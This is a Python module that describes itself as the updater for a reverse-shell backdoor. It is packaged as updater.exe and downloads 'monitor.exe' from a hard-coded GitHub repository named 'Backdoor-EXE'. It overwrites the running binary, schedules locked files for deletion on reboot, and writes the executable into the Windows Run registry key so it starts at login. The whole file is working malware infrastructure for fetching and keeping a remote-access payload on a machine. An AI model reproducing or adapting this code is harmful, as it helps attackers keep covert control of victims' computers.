"""
This module handles all the update related task for the reverse shell.
It gets packed into a exe file and is used to update the reverse shell when a new update is available.
"""

from __future__ import annotations

# 1st party imports
import os
import shutil
import sys
import tempfile
from pathlib import Path
from typing import Tuple, Optional

# 3rd party imports
import requests

# windows specific imports
import winreg
import time

# the file name of the updater
UPDATER_EXE = "updater.exe"
MAIN_EXE_NAME = "monitor.exe"


class UpdateManager:
    """Handle in-place application updates.

    Steps:
    1. Download the replacement executable from `exe_url`.
    2. Delete or overwrite the currently-running executable (provided as `old_exe_path`).
    3. Ensure persistence by adding the executable to the Windows *Run* key.
    """

    RUN_KEY_PATH = r"Software\\Microsoft\\Windows\\CurrentVersion\\Run"

    def __init__(
        self,
        exe_url: str,
        old_exe_path: Optional[str] = None,
        registry_name: str = "monitor",
    ) -> None:

        # the exe url from where the new version is to be downloaded
        self.exe_url = exe_url

        # the name of the registry key
        self.registry_name = registry_name

        # old_exe_path is optional when the updater is called without arguments
        self.old_exe: Optional[Path] = (
            Path(old_exe_path).resolve() if old_exe_path else None
        )

    def run(self) -> None:
        """Perform the update workflow then exit."""

        # download the new exe
        new_exe = self._download_exe()

        # if the download failed, abort
        if not new_exe:
            return

        # Replace the old executable if we know its location, otherwise just move
        # the freshly-downloaded file into the application directory untouched.
        if self.old_exe is not None:

            # remove the old version first
            self._remove_old_version(self.old_exe)

            # set the target path to the old version
            target_path = self.old_exe
        else:

            # set the target to C:/Program Files/monitor.exe
            target_path = Path("C:/Program Files/monitor.exe")

        try:
            # move the new version to the target path
            shutil.move(str(new_exe), str(target_path))

        except Exception:
            # Fallback – copy & remove to survive cross-volume moves
            shutil.copy2(new_exe, target_path)
            new_exe.unlink(missing_ok=True)

        # Ensure startup persistence
        self._add_to_startup(target_path)

    def _download_exe(self) -> Optional[Path]:
        """
        Download the update binary into a temporary directory.

        Returns:
            Optional[Path]: The path to the downloaded executable.
        """

        try:

            # make the request
            resp = requests.get(self.exe_url, timeout=60)

            # raise an exception if the request failed
            resp.raise_for_status()

        # Handle exceptions
        except Exception:
            return None

        # save the file
        directory = Path(tempfile.gettempdir())
        dest = directory / MAIN_EXE_NAME

        try:
            with open(dest, "wb") as fp:
                fp.write(resp.content)
        except Exception:
            return None

        return dest

    def _remove_old_version(self, exe_path: Path, max_wait: int = 30) -> None:
        """
        Attempt to delete the existing executable, retrying briefly.
        """

        # wait for the process to close
        end_time = time.time() + max_wait

        # try to remove the file
        while exe_path.exists() and time.time() < end_time:
            try:
                exe_path.unlink()
                break
            except PermissionError:
                # The process may still be shutting down – wait and retry
                time.sleep(0.5)

        # If still present, schedule for deletion on reboot
        if exe_path.exists():

            try:
                import ctypes

                ctypes.windll.kernel32.MoveFileExW(str(exe_path), None, 4)
            except Exception:
                pass

    def _add_to_startup(self, exe_path: Path) -> None:
        """
        Add the executable to Windows startup if not already present.

        Args:
            exe_path (Path): The path to the executable.
        """

        try:

            # Open the windows registry key in Read mode
            with winreg.OpenKey(
                winreg.HKEY_CURRENT_USER, self.RUN_KEY_PATH, 0, winreg.KEY_READ
            ) as key:

                # try to get the existing value
                try:
                    existing, _ = winreg.QueryValueEx(key, self.registry_name)

                    # if the existing value is the same as the new value
                    if Path(existing).resolve() == exe_path.resolve():
                        return  # already correctly set

                except FileNotFoundError:
                    pass  # value does not exist – will create below

        except FileNotFoundError:
            # The path may not exist in very old Windows versions; it will be created later.
            pass

        # Open the windows registry key in Write mode
        with winreg.CreateKey(winreg.HKEY_CURRENT_USER, self.RUN_KEY_PATH) as key:
            winreg.SetValueEx(key, self.registry_name, 0, winreg.REG_SZ, str(exe_path))

    def _app_dir(self) -> Path:
        """
        Return the directory the app is running from (handles PyInstaller).

        Returns:
            Path: The directory the app is running from.
        """

        if getattr(sys, "frozen", False):
            return Path(sys.executable).resolve().parent
        return Path(__file__).resolve().parent


if __name__ == "__main__":
    """Entry-point when packaged as `updater.exe`.

    Usage:
        updater.exe [old_exe_path]

    * `old_exe_path` - optional absolute/relative path of the executable that
      should be replaced. If omitted the updater will drop the newly downloaded
      file next to itself using `MAIN_EXE_NAME`.
    """

    # URL of the new build to download (hard-coded to project release url)
    exe_url = "https://github.com/Prithvi824/Backdoor-EXE/raw/refs/heads/main/dist/monitor.exe"

    # pick up optional CLI arg as the old exe path
    old_exe_path_cli = sys.argv[1] if len(sys.argv) > 1 else None

    updater = UpdateManager(exe_url, old_exe_path_cli)
    updater.run()
